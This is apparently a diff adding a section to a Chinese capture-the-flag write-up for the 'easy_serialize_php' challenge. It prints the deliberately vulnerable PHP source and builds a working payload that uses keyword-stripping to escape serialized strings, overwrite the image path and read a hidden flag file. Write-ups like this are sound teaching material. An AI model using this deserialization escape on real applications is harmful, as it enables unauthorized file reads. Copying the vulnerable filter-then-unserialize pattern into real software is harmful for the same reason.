@@ -156,3 +156,124 @@ int main(){
 }
 ```
 
+## 0x05 easy_serialize_php (赛后复现)
+
+给了源码
+
+```php
+<?php
+
+$function = @$_GET['f'];
+
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+
+
+if($_SESSION){
+    unset($_SESSION);
+}
+
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = $function;
+
+extract($_POST);
+
+if(!$function){
+    echo '<a href="index.php?f=highlight_file">source_code</a>';
+}
+
+if(!$_GET['img_path']){
+    $_SESSION['img'] = base64_encode('guest_img.png');
+}else{
+    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));
+}
+
+$serialize_info = filter(serialize($_SESSION));
+
+if($function == 'highlight_file'){
+    highlight_file('index.php');
+}else if($function == 'phpinfo'){
+    eval('phpinfo();'); //maybe you can find something in here!
+}else if($function == 'show_image'){
+    $userinfo = unserialize($serialize_info);
+    echo file_get_contents(base64_decode($userinfo['img']));
+}
+```
+
+看来是要利用``$serialize_info``来搞file_get_contents,
+
+``extract($_POST);`` 可以用来覆写``$_SESSION``，但是``$_SESSION['img']``没法搞，怎么办
+
+还是利用php反序列化长度变化尾部字符串逃逸搞,经过filter后``flag->''``就可以读到后面的东西了
+
+```php
+<?php
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = 'a"';
+$_SESSION['img'] = base64_encode('guest_img.png');
+
+$serialize_info = filter(serialize($_SESSION));
+
+
+echo $serialize_info;
+//a:3:{s:4:"user";s:5:"guest";s:8:"function";s:2:"a"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+
+?>
+```
+
+我们要覆盖的长度为
+
+``len('";s:8:"function";s:2:"a"')``
+
+填充6个flag即可
+
+问题是读什么呢？
+
+根据提示看一下phpinfo();
+
+可以看到auto_append_file:d0g3_f1ag.php
+
+读一下试试
+
+构造payload
+
+```php
+<?php
+function filter($img){
+    $filter_arr = array('php','flag','php5','php4','fl1g');
+    $filter = '/'.implode('|',$filter_arr).'/i';
+    return preg_replace($filter,'',$img);
+}
+/*
+$_SESSION["user"] = 'guest';
+$_SESSION['function'] = "show_image";
+$_SESSION['img'] = base64_encode('guest_img.png');
+*/
+
+$_SESSION["user"] = 'flagflagflagflagflagflag';
+$_SESSION['function'] = 'a";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:1:"b";}';
+$_SESSION['img'] = base64_encode('guest_img.png');
+
+$serialize_info = filter(serialize($_SESSION));
+
+//echo $serialize_info;
+$userinfo = unserialize($serialize_info);
+echo base64_decode($userinfo['img']);
+
+//origin a:3:{s:4:"user";s:5:"guest";s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}
+//dest: s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}
+//padding s:1:"a";s:1:"b";
+
+?>
+```
+
+返回了flag地址，再读一次就可
+
